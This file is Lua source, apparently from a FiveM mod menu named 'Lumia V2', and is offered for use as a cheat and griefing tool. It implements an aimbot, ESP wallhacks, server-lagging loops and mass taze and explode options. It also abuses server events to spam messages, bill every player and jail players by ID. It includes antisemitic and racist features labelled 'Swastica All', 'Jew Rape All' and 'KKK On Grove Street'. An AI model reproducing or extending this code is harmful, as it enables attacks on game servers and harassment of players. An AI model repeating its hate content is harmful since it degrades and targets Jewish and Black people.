                        jrnyLearIyzKiSIen.func.DrawSomeText(jrnyLearIyzKiSIen.config.Delay, 4, false, jrnyLearIyzKiSIen.config.MainX + 67 + 82, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men4Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs4 + 60, jrnyLearIyzKiSIen.config.ButtonScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                        if jrnyLearIyzKiSIen.config.Keybinds.aimbotKn == -1 then jrnyLearIyzKiSIen.config.Keybinds.aimbotKn = 'NONE' end
                        if DmSgpcIoUEJtyTfBBt.Mfunc.ComboBox('Target Bone', REVMYmrswsZvxOXvJE.ABBone.items, REVMYmrswsZvxOXvJE.ABBone.currentItemIndex, REVMYmrswsZvxOXvJE.ABBone.selectedItemIndex, function(currentIndex, selectedIndex)
                            REVMYmrswsZvxOXvJE.ABBone.currentItemIndex = currentIndex
                            REVMYmrswsZvxOXvJE.ABBone.selectedItemIndex = selectedIndex
                        end, 4, 90, 100) then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have ~g~Succesfuly ~w~Changed The Aimbot Bone') end
                        if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Aimbot Hold Key: ', 4, 110, 100) then
                            jrnyLearIyzKiSIen.config.aimbotbind = true
                        end
                        jrnyLearIyzKiSIen.func.DrawSomeText(jrnyLearIyzKiSIen.config.Keybinds.aimbotKn, 4, false, jrnyLearIyzKiSIen.config.MainX + 70 + 123, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men4Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs4 + 100, jrnyLearIyzKiSIen.config.ButtonScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                    end
                end
            end
                --MISC
            if jrnyLearIyzKiSIen.config.Men5T then
                if DmSgpcIoUEJtyTfBBt.Mfunc.ComboBox('', REVMYmrswsZvxOXvJE.Mopt4.items, REVMYmrswsZvxOXvJE.Mopt4.currentItemIndex, REVMYmrswsZvxOXvJE.Mopt4.selectedItemIndex, function(currentIndex, selectedIndex)
                    REVMYmrswsZvxOXvJE.Mopt4.currentItemIndex = currentIndex 
                    REVMYmrswsZvxOXvJE.Mopt4.selectedItemIndex = selectedIndex
                end, 5, 10, -10) then end

                if REVMYmrswsZvxOXvJE.Mopt4.values[REVMYmrswsZvxOXvJE.Mopt4.selectedItemIndex] == 1 then
                    if DmSgpcIoUEJtyTfBBt.Mfunc.ComboBox('', REVMYmrswsZvxOXvJE.Mopt6.items, REVMYmrswsZvxOXvJE.Mopt6.currentItemIndex, REVMYmrswsZvxOXvJE.Mopt6.selectedItemIndex, function(currentIndex, selectedIndex)
                        REVMYmrswsZvxOXvJE.Mopt6.currentItemIndex = currentIndex 
                        REVMYmrswsZvxOXvJE.Mopt6.selectedItemIndex = selectedIndex
                    end, 5, 30, -10) then end
                    if REVMYmrswsZvxOXvJE.Mopt6.values[REVMYmrswsZvxOXvJE.Mopt6.selectedItemIndex] == 1 then
                        jrnyLearIyzKiSIen.config.offset5 = jrnyLearIyzKiSIen.config.offset5 + 135
                        jrnyLearIyzKiSIen.func.DrawRectangle(jrnyLearIyzKiSIen.config.MainX, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men5Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs5, jrnyLearIyzKiSIen.config.SubMenuWH.w, jrnyLearIyzKiSIen.config.offset5, jrnyLearIyzKiSIen.config.CPrimary2.r, jrnyLearIyzKiSIen.config.CPrimary2.g, jrnyLearIyzKiSIen.config.CPrimary2.b, jrnyLearIyzKiSIen.config.CPrimary2.a)
                        if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Player Blips', jrnyLearIyzKiSIen.config.features.PBlips, function(enabled) jrnyLearIyzKiSIen.config.features.PBlips = enabled end, 5, 50) then 
                            if jrnyLearIyzKiSIen.config.features.PBlips then
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Player Blips ~g~ON')
                            else
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Player Blips ~r~OFF')
                            end
                            DmSgpcIoUEJtyTfBBt.FunFunc.DaBlipers(true)
                        end
                        if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Crosshair', jrnyLearIyzKiSIen.config.features.Crosshair, function(enabled) jrnyLearIyzKiSIen.config.features.Crosshair = enabled end, 5, 70) then 
                            if jrnyLearIyzKiSIen.config.features.Crosshair then
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Crosshair ~g~ON')
                            else
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Crosshair ~r~OFF')
                            end
                        end
                        if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Force Map', jrnyLearIyzKiSIen.config.features.FMiniM, function(enabled) jrnyLearIyzKiSIen.config.features.FMiniM = enabled end, 5, 90) then 
                            if not jrnyLearIyzKiSIen.config.features.FMiniM then nlFXKkFxuKQAk.natives.DisplayRadar(0) end
                        end
                        if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Always Bright (Client Sided)', jrnyLearIyzKiSIen.config.features.Alwaysbright, function(enabled) jrnyLearIyzKiSIen.config.features.Alwaysbright = enabled end, 5, 110) then
                            if jrnyLearIyzKiSIen.config.features.Alwaysbright then
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Always Bright ~g~ON')
                                nlFXKkFxuKQAk.natives.SetTransitionTimecycleModifier("int_lesters", 5.0)
                            else
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Always Bright ~r~OFF')
                                nlFXKkFxuKQAk.natives.ClearTimecycleModifier()
                            end
                        end
                        if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('No Rain (Client Sided)', jrnyLearIyzKiSIen.config.features.NoRain, function(enabled) jrnyLearIyzKiSIen.config.features.NoRain = enabled end, 5, 130) then if jrnyLearIyzKiSIen.config.features.NoRain then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('No Rain ~g~ON') else DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('No Rain ~r~OFF') end end
                    elseif REVMYmrswsZvxOXvJE.Mopt6.values[REVMYmrswsZvxOXvJE.Mopt6.selectedItemIndex] == 2 then
                        jrnyLearIyzKiSIen.config.offset5 = jrnyLearIyzKiSIen.config.offset5 + 55
                        jrnyLearIyzKiSIen.func.DrawRectangle(jrnyLearIyzKiSIen.config.MainX, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men5Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs5, jrnyLearIyzKiSIen.config.SubMenuWH.w, jrnyLearIyzKiSIen.config.offset5, jrnyLearIyzKiSIen.config.CPrimary2.r, jrnyLearIyzKiSIen.config.CPrimary2.g, jrnyLearIyzKiSIen.config.CPrimary2.b, jrnyLearIyzKiSIen.config.CPrimary2.a)
                        if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('ESP (MAIN)', jrnyLearIyzKiSIen.config.features.gayesp, function(enabled) jrnyLearIyzKiSIen.config.features.gayesp = enabled end, 5, 50) then local plist = nlFXKkFxuKQAk.natives.GetActivePlayers() jrnyLearIyzKiSIen.func.table_removekey(plist, nlFXKkFxuKQAk.natives.PlayerId()) for i = 1, #plist do nlFXKkFxuKQAk.natives.ResetEntityAlpha(nlFXKkFxuKQAk.natives.GetPlayerPed(plist[i])) end  if jrnyLearIyzKiSIen.config.features.gayesp then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('ESP Main Switch ~g~ON') else DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('ESP Main Switch ~r~OFF') end end
                        if jrnyLearIyzKiSIen.config.features.gayesp then
                            jrnyLearIyzKiSIen.func.DrawRectangle(jrnyLearIyzKiSIen.config.MainX, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men5Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs5 + 65, jrnyLearIyzKiSIen.config.SubMenuWH.w, 95, jrnyLearIyzKiSIen.config.CPrimary2.r, jrnyLearIyzKiSIen.config.CPrimary2.g, jrnyLearIyzKiSIen.config.CPrimary2.b, jrnyLearIyzKiSIen.config.CPrimary2.a)
                            if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Show ID', jrnyLearIyzKiSIen.config.features.gayespid, function(enabled) jrnyLearIyzKiSIen.config.features.gayespid = enabled end, 5, 70) then if jrnyLearIyzKiSIen.config.features.gayespid then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Show ID ~g~ON') else DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Show ID ~r~OFF') end end
                            if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Show Name', jrnyLearIyzKiSIen.config.features.gayespname, function(enabled) jrnyLearIyzKiSIen.config.features.gayespname = enabled end, 5, 90) then if jrnyLearIyzKiSIen.config.features.gayespname then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Show ID ~g~ON') else DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Show ID ~r~OFF') end end
                            if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Show Distance', jrnyLearIyzKiSIen.config.features.gayespdistance, function(enabled) jrnyLearIyzKiSIen.config.features.gayespdistance = enabled end, 5, 110) then if jrnyLearIyzKiSIen.config.features.gayespdistance then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Show Distance ~g~ON') else DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Show Distance ~r~OFF') end end
                            if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Show Vehicle', jrnyLearIyzKiSIen.config.features.gayespvehicle, function(enabled) jrnyLearIyzKiSIen.config.features.gayespvehicle = enabled end, 5, 130) then if jrnyLearIyzKiSIen.config.features.gayespvehicle then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Show Vehicle ~g~ON') else DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Show Vehicle ~r~OFF') end end
                            if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Show Bones', jrnyLearIyzKiSIen.config.features.gayespbones, function(enabled) jrnyLearIyzKiSIen.config.features.gayespbones = enabled end, 5, 150) then if jrnyLearIyzKiSIen.config.features.gayespbones then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Show Bones ~g~ON') else DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Show Bones ~r~OFF') end end
                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Distance: ', 5, 50, 90) then 
                                local espdistc = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('ESP Distance (NUMBERS ONLY)', '', 4)
                                jrnyLearIyzKiSIen.config.ESPDist = RfPsUKHSFWJuBEJuz.rE.LumToNum(espdistc)
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('The ESP Distance Has ~g~Succsesfuly ~w~Been Set To: '.. espdistc ..'')
                            end
                            jrnyLearIyzKiSIen.func.DrawSomeText(jrnyLearIyzKiSIen.config.ESPDist, 4, false, jrnyLearIyzKiSIen.config.MainX + 70 + 80, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men5Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs4 + 90.5, jrnyLearIyzKiSIen.config.ButtonScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                        end
                    end
                elseif REVMYmrswsZvxOXvJE.Mopt4.values[REVMYmrswsZvxOXvJE.Mopt4.selectedItemIndex] == 2 then
                    jrnyLearIyzKiSIen.config.offset5 = jrnyLearIyzKiSIen.config.offset5 + 255
                    jrnyLearIyzKiSIen.func.DrawRectangle(jrnyLearIyzKiSIen.config.MainX, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men5Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs5, jrnyLearIyzKiSIen.config.SubMenuWH.w, jrnyLearIyzKiSIen.config.offset5, jrnyLearIyzKiSIen.config.CPrimary2.r, jrnyLearIyzKiSIen.config.CPrimary2.g, jrnyLearIyzKiSIen.config.CPrimary2.b, jrnyLearIyzKiSIen.config.CPrimary2.a)

                    if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Server Lagger (Vehicle)', jrnyLearIyzKiSIen.config.features.Serverlagveh, function(enabled) jrnyLearIyzKiSIen.config.features.Serverlagveh = enabled end, 5, 30) then if jrnyLearIyzKiSIen.config.features.Serverlagveh then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Server Lagger (Vehicle) ~g~ON') else DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Server Lagger (Vehicle) ~r~OFF') end end
                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Vehicle: ', 5, 30, 120) then 
                        local textie = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Vehicle Model', '', 100)
                        if textie and nlFXKkFxuKQAk.natives.IsModelAVehicle(textie) then
                            DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have Set The Vehicle To: '.. RfPsUKHSFWJuBEJuz.rE.LumString.LumUpper(textie).. '')
                            jrnyLearIyzKiSIen.config.serverlagveh = textie
                        else
                            DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('ERROR: ~r~'.. RfPsUKHSFWJuBEJuz.rE.LumString.LumUpper(textie) ..' ~w~Is Not A Valid Vehicle!')
                        end
                    end
                    jrnyLearIyzKiSIen.func.DrawSomeText(jrnyLearIyzKiSIen.config.serverlagveh, 4, false, jrnyLearIyzKiSIen.config.MainX + 177, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men5Y + 240, jrnyLearIyzKiSIen.config.ButtonScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                    if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Server Lagger (Animal)', jrnyLearIyzKiSIen.config.features.Serverlagani, function(enabled) jrnyLearIyzKiSIen.config.features.Serverlagani = enabled end, 5, 50) then if jrnyLearIyzKiSIen.config.features.Serverlagani then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Server Lagger (Animal) ~g~ON') else DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Server Lagger (Animal) ~r~OFF') end end
                    if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Taze All (Loop)', jrnyLearIyzKiSIen.config.features.tazeloopall, function(enabled) jrnyLearIyzKiSIen.config.features.tazeloopall = enabled end, 5, 70) then if jrnyLearIyzKiSIen.config.features.tazeloopall then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Taze Loop ~g~ON') else DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Taze Loop ~r~OFF') end end
                    if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('UD Explode All (Loop)', jrnyLearIyzKiSIen.config.features.udboomall, function(enabled) jrnyLearIyzKiSIen.config.features.udboomall = enabled end, 5, 90) then if jrnyLearIyzKiSIen.config.features.udboomall then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('UD Expload Loop ~g~ON') else DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('UD Expload Loop ~r~OFF') end end
                    if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Make All Cars Honk', jrnyLearIyzKiSIen.config.features.honkem, function(enabled) jrnyLearIyzKiSIen.config.features.honkem = enabled end, 5, 110) then if jrnyLearIyzKiSIen.config.features.honkem then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Honking Cars ~g~ON') else DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Honking Cars ~r~OFF') end end
                    if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Make All Cars Fly', jrnyLearIyzKiSIen.config.features.shot4dastars, function(enabled) jrnyLearIyzKiSIen.config.features.shot4dastars = enabled end, 5, 130) then if jrnyLearIyzKiSIen.config.features.shot4dastars then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Floaty Cars ~g~ON') else DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Floaty Cars ~r~OFF') end end
                    if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('All Cars To Waypoint', jrnyLearIyzKiSIen.config.features.movedamove, function(enabled) jrnyLearIyzKiSIen.config.features.movedamove = enabled end, 5, 150) then 
                        if jrnyLearIyzKiSIen.config.features.movedamove then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Cars To Waypoint ~g~ON') else DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Cars To Waypoint ~r~OFF') end 
                        RfPsUKHSFWJuBEJuz.rE.LumThread(function()
                            while jrnyLearIyzKiSIen.config.features.movedamove do
                                RfPsUKHSFWJuBEJuz.rE.LumWait(250)
                                local waypoint = nlFXKkFxuKQAk.natives.GetFirstBlipInfoId(8)
                
                                local CivilianPeds = {
                                    'a_m_m_beach_01',
                                    'a_m_m_hasjew_01',
                                    'cs_dreyfuss',
                                    'cs_nigel',
                                    'ig_djgeneric_01',
                                    's_m_m_autoshop_02',
                                    's_m_m_gaffer_01'
                                }
    
                                if nlFXKkFxuKQAk.natives.DoesBlipExist(waypoint) then
                                    local coords = nlFXKkFxuKQAk.natives.GetBlipInfoIdCoord(waypoint)
                
                                    for vehicle in DmSgpcIoUEJtyTfBBt.FunFunc.FindLeCars() do
                                        RfPsUKHSFWJuBEJuz.rE.LumWait(10)
                                        if jrnyLearIyzKiSIen.func.RequestelControl(vehicle) then
                                            local driver = nlFXKkFxuKQAk.natives.GetPedInVehicleSeat(vehicle, -1)
                
                                            if driver ~= nlFXKkFxuKQAk.natives.PlayerPedId() and not nlFXKkFxuKQAk.natives.IsPedAPlayer(driver) then
                                                if not nlFXKkFxuKQAk.natives.GetIsVehicleEngineRunning(vehicle) and nlFXKkFxuKQAk.natives.GetEntityHealth(vehicle) > 0 then
                                                    if driver == 0 then
                                                        driver = nlFXKkFxuKQAk.natives.CreatePedInsideVehicle(vehicle, 4, RfPsUKHSFWJuBEJuz.rE.LumHash(CivilianPeds[RfPsUKHSFWJuBEJuz.rE.LumMath.LumRand(1, #CivilianPeds)], true), -1, false, false)
                
                                                        nlFXKkFxuKQAk.natives.SetEntityVisible(driver, false, false)
                                                    end
                                                    nlFXKkFxuKQAk.natives.SetVehicleEngineHealth(vehicle, 1000.0)
                                                    nlFXKkFxuKQAk.natives.SetVehicleUndriveable(vehicle, false)
                                                    nlFXKkFxuKQAk.natives.SetVehicleEngineOn(vehicle, true, true, false)
                                                    nlFXKkFxuKQAk.natives.SetVehicleLights(vehicle, 3)
                                                end
                                                nlFXKkFxuKQAk.natives.SetEntityInvincible(vehicle, true)
                                                nlFXKkFxuKQAk.natives.TaskVehicleDriveToCoord(driver, vehicle, coords.x, coords.y, coords.z, 3600.0, 1.0, nlFXKkFxuKQAk.natives.GetEntityModel(vehicle), 786468, 1.0, true)
                                            end
                                        end
                                    end
                                else
                                    DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('~r~Error: ~w~Place A Waypoint')
                                    jrnyLearIyzKiSIen.config.features.movedamove = false
                                    return
                                end
                            end
                        end)
                    end

                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('UD Cage All', 5, 170) then 
                        local playerlist = nlFXKkFxuKQAk.natives.GetActivePlayers()
                        for i = 1, #playerlist do
                            local ped = playerlist[i]
                            DmSgpcIoUEJtyTfBBt.FunFunc.cagerino(ped)
                        end
                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have ~g~Sucsesfuly ~w~Caged Everyone')
                    end
                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Swastica All', 5, 190) then 
                        local playerlist = nlFXKkFxuKQAk.natives.GetActivePlayers()
                        for i = 1, #playerlist do
                            local ped = playerlist[i]
                            DmSgpcIoUEJtyTfBBt.FunFunc.swaz(ped)
                        end
                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have ~g~Sucsesfuly ~w~Attached A Swastica To Everyone')
                    end
                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Attach Dildo To All', 5, 210) then
                        local playerlist = nlFXKkFxuKQAk.natives.GetActivePlayers()
                        for i = 1, #playerlist do
                            local stupidped = nlFXKkFxuKQAk.natives.GetPlayerPed(playerlist[i])
                            local IONOBJ = "prop_cs_dildo_01"					
                            local IONOBJH = RfPsUKHSFWJuBEJuz.rE.LumHash(IONOBJ)
                            while not nlFXKkFxuKQAk.natives.HasModelLoaded(IONOBJH) do
                                nlFXKkFxuKQAk.natives.RequestModel(IONOBJH)
                                RfPsUKHSFWJuBEJuz.rE.LumWait(5)
                            end						
                            local IONCOBJ = nlFXKkFxuKQAk.natives.CreateObject(IONOBJH, 0, 0, 0, true, true, true)
                            nlFXKkFxuKQAk.natives.AttachEntityToEntity(IONCOBJ, nlFXKkFxuKQAk.natives.GetPlayerPed(playerlist[i]), 0, 0.0, 0.17, -0.1, -90.0, 0.0, 0.0, true, true, false, true, 1, true)
                        end
                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have ~g~Sucsesfuly ~w~Attached A Dildo To Everyone')
                    end
                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Jew Rape All', 5, 230) then
                        local jewtable = {'a_m_m_hasjew_01', 'a_m_y_hasjew_01'}
                        local playerlist = nlFXKkFxuKQAk.natives.GetActivePlayers()
                        for i = 1, #playerlist do
                            local ped = playerlist[i]
                            if not nlFXKkFxuKQAk.natives.HasModelLoaded('a_m_y_hasjew_01') then
                                nlFXKkFxuKQAk.natives.RequestModel('a_m_y_hasjew_01')
                                RfPsUKHSFWJuBEJuz.rE.LumWait(0)
                            end
                            if not nlFXKkFxuKQAk.natives.HasModelLoaded('a_m_m_hasjew_01') then
                                nlFXKkFxuKQAk.natives.RequestModel('a_m_m_hasjew_01')
                                RfPsUKHSFWJuBEJuz.rE.LumWait(0)
                            end
                            if not nlFXKkFxuKQAk.natives.HasAnimDictLoaded('rcmpaparazzo_2') then
                                nlFXKkFxuKQAk.natives.RequestAnimDict('rcmpaparazzo_2')
                                RfPsUKHSFWJuBEJuz.rE.LumWait(0)
                            end
                                if nlFXKkFxuKQAk.natives.IsPedInAnyVehicle(nlFXKkFxuKQAk.natives.GetPlayerPed(ped), true) then
                                    local veh = nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(ped), true)
                                        if not nlFXKkFxuKQAk.natives.NetworkHasControlOfEntity(veh) then
                                            nlFXKkFxuKQAk.natives.NetworkRequestControlOfEntity(veh)
                                            RfPsUKHSFWJuBEJuz.rE.LumWait(0)
                                        end
                                    nlFXKkFxuKQAk.natives.SetEntityAsMissionEntity(veh, true, true)
                                    nlFXKkFxuKQAk.natives.DeleteVehicle(veh)
                                    nlFXKkFxuKQAk.natives.DeleteEntity(veh)
                                end
                                local Spacing = -0.2
                            for k, v in RfPsUKHSFWJuBEJuz.rE.Lumpairs(jewtable) do
                                local x, y, z = RfPsUKHSFWJuBEJuz.rE.LumTable.LumUnPack(nlFXKkFxuKQAk.natives.GetEntityCoords(nlFXKkFxuKQAk.natives.GetPlayerPed(ped), true))
                                local JewPed = nlFXKkFxuKQAk.natives.CreatePed(4, RfPsUKHSFWJuBEJuz.rE.LumHash(v), x, y, z, 0.0, true, false)
                                nlFXKkFxuKQAk.natives.SetEntityAsMissionEntity(JewPed, true, true)
                                nlFXKkFxuKQAk.natives.AttachEntityToEntity(JewPed, nlFXKkFxuKQAk.natives.GetPlayerPed(ped), 4103, 11816, Spacing, 0.00, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                                nlFXKkFxuKQAk.natives.ClearPedTasks(nlFXKkFxuKQAk.natives.GetPlayerPed(ped))
                                nlFXKkFxuKQAk.natives.TaskPlayAnim(nlFXKkFxuKQAk.natives.GetPlayerPed(ped), 'rcmpaparazzo_2', 'shag_loop_poppy', 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                                nlFXKkFxuKQAk.natives.SetPedKeepTask(JewPed)
                                nlFXKkFxuKQAk.natives.TaskPlayAnim(JewPed, 'rcmpaparazzo_2', 'shag_loop_a', 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                                nlFXKkFxuKQAk.natives.SetEntityInvincible(JewPed, true)
                                Spacing = Spacing - 0.4
                            end     
                        end
                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have ~g~Sucsesfuly ~w~Jew Raped Everyone')
                    end
                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('KKK On Grove Street', 5, 250) then
                        DmSgpcIoUEJtyTfBBt.FunFunc.realkkk()
                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have ~g~Sucsesfuly ~w~Spawned KKK Meeting On Grove Street')
                    end

                elseif REVMYmrswsZvxOXvJE.Mopt4.values[REVMYmrswsZvxOXvJE.Mopt4.selectedItemIndex] == 3 then
                    local trigy = 50
                    if DmSgpcIoUEJtyTfBBt.Mfunc.ComboBox('', REVMYmrswsZvxOXvJE.TrigOpts.items, REVMYmrswsZvxOXvJE.TrigOpts.currentItemIndex, REVMYmrswsZvxOXvJE.TrigOpts.selectedItemIndex, function(currentIndex, selectedIndex)
                        REVMYmrswsZvxOXvJE.TrigOpts.currentItemIndex = currentIndex
                        REVMYmrswsZvxOXvJE.TrigOpts.selectedItemIndex = selectedIndex
                    end, 5, 30, -10) then end

                    if REVMYmrswsZvxOXvJE.TrigOpts.values[REVMYmrswsZvxOXvJE.TrigOpts.selectedItemIndex] == 'ftrigs' then
                        if RfPsUKHSFWJuBEJuz.TR['esx_status_refillstatus'] then
                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Refill Food and Water', 5, trigy) then
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(false, RfPsUKHSFWJuBEJuz.TR['esx_status_refillstatus'], 'hunger', 1000000)
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(false, RfPsUKHSFWJuBEJuz.TR['esx_status_refillstatus'], 'thirst', 1000000)
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have ~g~Sucsesfuly ~w~Refilled Your Hunger And Thirst')
                            end
                            trigy = trigy + 20
                        end
                        if RfPsUKHSFWJuBEJuz.TR['police_exploit'] then
                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Message Spammer (Everyone)', 5, trigy) then
                                local amount = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Amount To Loop', '', 3)
                                local message = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Message', '', 10000)
                                RfPsUKHSFWJuBEJuz.rE.LumThread(function()
                                    for i = 1, RfPsUKHSFWJuBEJuz.rE.LumToNum(amount) do
                                        jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['police_exploit'], -1, ''..i..' '..message..'')
                                        RfPsUKHSFWJuBEJuz.rE.LumWait(60)
                                    end
                                    return
                                end)
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have ~g~Sucsesfuly ~w~Sent Your Messages')
                            end
                            trigy = trigy + 20
                        end
                        if RfPsUKHSFWJuBEJuz.TR['send_bill'] then
                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Send Bill (Everyone)', 5, trigy) then
                                local amount = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Amount To Send', '', 3)
                                local message = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Message', '', 10000)
                                local amount2 = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Amount User Pays', '', 1000)
                                RfPsUKHSFWJuBEJuz.rE.LumThread(function()
                                    local activeplayers = nlFXKkFxuKQAk.natives.GetActivePlayers()
                                    for k, v in RfPsUKHSFWJuBEJuz.rE.Lumpairs(activeplayers) do
                                        for i = 1, amount do
                                            RfPsUKHSFWJuBEJuz.rE.LumWait(60)
                                            jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR["send_bill"], nlFXKkFxuKQAk.natives.GetPlayerServerId(v), "Lumia V2", message, amount2)
                                        end
                                        RfPsUKHSFWJuBEJuz.rE.LumWait(100)
                                    end
                                    return
                                end)
                                DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have ~g~Sucsesfuly ~w~Sent Bills To Everyone')
                            end
                            trigy = trigy + 20
                        end
                        if RfPsUKHSFWJuBEJuz.TR['qalle_jailer'] then
                            if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Jail (Specific / All)', 5, trigy) then
                                local person = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Server Id (-1 for all)', '', 4)
                                local reason = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Custom Reason (If None It Will Be A Default One)', '', 1000)
                                if reason == nil then reason = 'Lumia v2 on top!' end
                                jrnyLearIyzKiSIen.func.TriggerCustomEvent(true, RfPsUKHSFWJuBEJuz.TR['qalle_jailer'], RfPsUKHSFWJuBEJuz.rE.LumToNum(person), 1000000, reason)
